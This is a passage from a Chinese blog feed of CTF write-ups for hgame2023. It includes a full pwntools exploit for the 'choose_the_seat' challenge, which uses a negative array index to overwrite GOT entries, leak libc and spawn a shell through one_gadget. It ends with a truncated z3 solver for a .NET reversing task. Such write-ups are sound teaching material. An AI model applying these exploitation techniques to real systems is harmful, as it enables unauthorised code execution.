alt=\"image.png\"><br>\n 点开是 2 个 WTF 函数充斥着 RC4 算法的特征 这时候还没细看 直接动态调试提取 key 试试原版 RC4 (感觉一般 RC4 不会魔改吧)<br>\n<img data-src=\"/images/n17.png\" alt=\"image.png\"><br>\n 前面对 key 有个循环处理不用管 直接提取处理后的 <strong>secpunk:</strong><br>\n<img data-src=\"/images/n18.png\" alt=\"image.png\"><br>\nRC4 为对称加密 把比较数据转换为 hex 字符串然后 RC4 就能得到 flag<br>\n<img data-src=\"/images/n19.png\" alt=\"image.png\"><br>\nsecpunk</p>\n<p>成功 get flag</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/04/hgame2023%20%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "url": "https://3cly.github.io/2023/02/04/hgame2023%20%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "title": "hgame2023 部分做题记录",
            "date_published": "2023-02-04T05:02:58.000Z",
            "content_html": "<h1 id=\"hgame2023-部分题记录\"><a class=\"markdownIt-Anchor\" href=\"#hgame2023-部分题记录\">#</a> hgame2023 部分题记录</h1>\n<p>做的主要是二进制 杂项做了一些 然后做了一道 IOT 有关 MQTT 的 50 分的题 一道 web 签到题 (打开页面源码就有那种)</p>\n<p>记录了一些个人认为需要记录的题</p>\n<h2 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> WEEK1</h2>\n<h3 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h3>\n<h4 id=\"choose_the_seat\"><a class=\"markdownIt-Anchor\" href=\"#choose_the_seat\">#</a> choose_the_seat</h4>\n<p><img data-src=\"/images/image-20230129183211218.png\" alt=\"image.png\"></p>\n<p>IDA 中查看 没有后门函数 没有 bin/sh 字符串 认为和 ret2libc 有关可能要泄漏 got 表</p>\n<p><img data-src=\"/images/image-20230129183939209.png\" alt=\"image.png\"></p>\n<p>检查保护，只开了 nx 保护 (No-eXecute, 不可执行保护） RELRO 为 Partial RELRO 也就是说 got 表可以修改</p>\n<h5 id=\"relro保护补充\"><a class=\"markdownIt-Anchor\" href=\"#relro保护补充\">#</a> <strong>RELRO 保护补充</strong></h5>\n<p>在 Linux 中有两种 RELRO 模式： <code>Partial RELRO</code>  和  <code>Full RELRO</code> 。Linux 中 <code>Partical RELRO</code>  默认开启。如果开启  <code>FUll RELRO</code> ，意味着我们无法修改 got 表，这样也就没法通过修改 GOT 表来进行 <strong>Return-to-libc</strong> 攻击</p>\n<p>hint 是数组越界，通过查找资料发现</p>\n<h5 id=\"数组越界\"><a class=\"markdownIt-Anchor\" href=\"#数组越界\">#</a> 数组越界</h5>\n<p>所谓的数组越界，简单地讲就是指数组下标变量的取值超过了初始定义时的大小，导致对数组元素的访问出现在数组的范围之外，这类错误也是 C 语言程序中最常见的错误之一。</p>\n<p>在 C 语言中，数组必须是静态的。换而言之，数组的大小必须在程序运行前就确定下来。由于 C 语言并不具有类似 Java  等语言中现有的静态分析工具的功能，可以对程序中数组下标取值范围进行严格检查，一旦发现数组上溢或下溢，都会因抛出异常而终止程序。也就是说，C  语言并不检验数组边界，数组的两端都有可能越界，从而使其他变量的数据甚至程序代码被破坏。</p>\n<p>我们可以用数组越界漏洞，将 got 表里 printf 函数的地址修改成 system（‘/bin/sh’”）的地址，那么程序在之后调用 printf 函数时，实际上调用的是函数 system（‘/bin/sh’”），这样我们就获得了目标主机的控制权限。</p>\n<p><img data-src=\"/images/image-20230129192048928.png\" alt=\"image.png\"></p>\n<p>这里有个 if (v0&gt;9) 退出 而若要数组越界 v0==10 所以考虑 v0 为负数产生越界</p>\n<p>seats 是储存在 bss 中，可以反向越界修改 got 表</p>\n<p>根据 got 表中的偏移可以计算出用到的下标的大小</p>\n<p>泄漏 got 表 之前我还没看偏移 纯动态调试…🙁</p>\n<p><img data-src=\"/images/image.png\" alt=\"image.png\"></p>\n<p>-10 之后 覆盖到这里了！！！</p>\n<p><img data-src=\"/images/123.png\" alt=\"image.png\"></p>\n<p>-9 覆盖到 put</p>\n<p><strong>-7 是 read</strong></p>\n<p><img data-src=\"/images/7778.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230130002855289.png\" alt=\"image.png\"></p>\n<p><strong>偏移计算得 - 6 覆盖到 exit 退出函数</strong></p>\n<p>开始写 EXP</p>\n<p><strong>第一步</strong>：通过修改 exit 函数的 got 表为 start 让程序反复执行</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_start'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#['vuln']</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#反复执行</span></pre></td></tr></table></figure><p><strong>第二步</strong>：泄漏 read 地址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-7'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\xc0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#让后面的 puts 泄露 read 真实地址</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>read_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>p.send (b’\\xc0’) 是因为程序开了 <strong>aslr 保护</strong>（最后三位不变）偏移不变</p>\n<p>可查看 got 表查看 read 函数最后偏移就是 c0 这里没有修改 read 函数 目的就是泄漏</p>\n<p>最后这里用了 one_gadget 工具</p>\n<p><img data-src=\"/images/image-20230130005749259.png\" alt=\"image.png\"></p>\n<p>one_gadget 就是用来去查找动态链接库里 execve (&quot;/bin/sh&quot;, rsp+0x70, environ) 函数的地址的</p>\n<p>因为环境问题若要本地打通自己配置了一下 libc 和 ld …</p>\n<h5 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> EXP：</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">\"debug\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"konsole\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-e\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./vuln\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p = remote()</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./vuln\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc-2.31.so\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p = remote(\"\",10000)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b* $rebase(0xadf)\")</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_start'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#['vuln']</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#反复执行</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-7'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\xc0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#让后面的 puts 泄露 read 真实地址</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>read_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>libc_base<span class=\"token operator\">=</span>read_addr<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>one_gadget<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0xe3b04</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3b01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3afe</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>shell<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>one_gadget<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"name\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#libc 版本问题？</span></pre></td></tr></table></figure><h2 id=\"week3\"><a class=\"markdownIt-Anchor\" href=\"#week3\">#</a> WEEK3</h2>\n<p>春节太忙了 week3 题没怎么做 啊哈哈…</p>\n<h3 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h3>\n<h4 id=\"kunmusic\"><a class=\"markdownIt-Anchor\" href=\"#kunmusic\">#</a> kunmusic</h4>\n<p>DLL 放进 DIE 或看附件的 JS 文件得知是一个.NET 程序</p>\n<p>dnspy 打开找到 main 函数</p>\n<p><img data-src=\"/images/image-20230202140851378.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230202192734759.png\" alt=\"image.png\"></p>\n<p>断点 dump 出 data 由 MZ 文件头发现是一个二进制文件 (64 位的 dnspy)</p>\n<p>用 winhex 新建为文件</p>\n<p><img data-src=\"/images/image-20230202193201803.png\" alt=\"image.png\"></p>\n<p>DIE 查看是 .NET 的 DLL 文件</p>\n<p><img data-src=\"/images/image-20230202194330948.png\" alt=\"image.png\"></p>\n<p>再动调 (静态也能看) 发现 dump 出的 dll 有个 music 函数有个巨大的 if 判断 用 z3 解就行了 然后后面有一个数组异或解出的数据就是 flag</p>\n<p><img data-src=\"/images/image-20230202194558459.png\" alt=\"image.png\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>array <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">132</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token number\">180</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">216</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">68</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">39</span><span class=\"token punctuation\">,</span><span class=\"token number\">246</span><span class=\"token punctuation\">,</span><span class=\"token number\">124</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">243</span><span class=\"token punctuation\">,</span><span class=\"token number\">137</span><span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span><span class=\"token number\">172</span><span class=\"token punctuation\">,</span><span class=\"token number\">53</span><span class=\"token punctuation\">,</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">91</span><span class=\"token punctuation\">,</span><span class=\"token number\">83</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">171</span><span class=\"token punctuation\">,</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">235</span><span class=\"token punctuation\">,</span><span class=\"token number\">179</span><span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span><span class=\"token number\">176</span><span class=\"token punctuation\">,</span><span class=\"token number\">28</span><span class=\"token punctuation\">,</span><span class=\"token number\">216</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span><span class=\"token number\">39</span><span class=\"token punctuation\">,</span><span class=\"token number\">162</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span><span class=\"token number\">236</span><span class=\"token punctuation\">,</span><span class=\"token number\">130</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span><span class=\"token number\">176</span><span class=\"token punctuation\">,</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span><span class=\"token number\">212</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">89</span><span class=\"token punctuation\">,</span><span class=\"token number\">72</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'x%d'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 初始化序列</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建约束求解器</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">52296</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26211</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">11754</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">41236</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">63747</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">52714</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10512</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">12972</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">45505</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">21713</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">59122</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12840</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21087</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">12702282</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">25228</span> <span class=\"token operator\">+</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">20699</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">8158</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">65307</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30701</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">47555</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2557</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">49055</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">7992</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">57465</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">57426</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">13299</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">50966</span> <span class=\"token operator\">==</span> <span class=\"token number\">9946829</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">64801</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60698</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token number\">40853</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">54907</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">29882</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">13574</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21310</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token number\">47366</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">41784</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">53690</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">58436</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15590</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token number\">58225</span> <span class=\"token operator\">==</span> <span class=\"token number\">2372055</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">61538</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">17121</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token 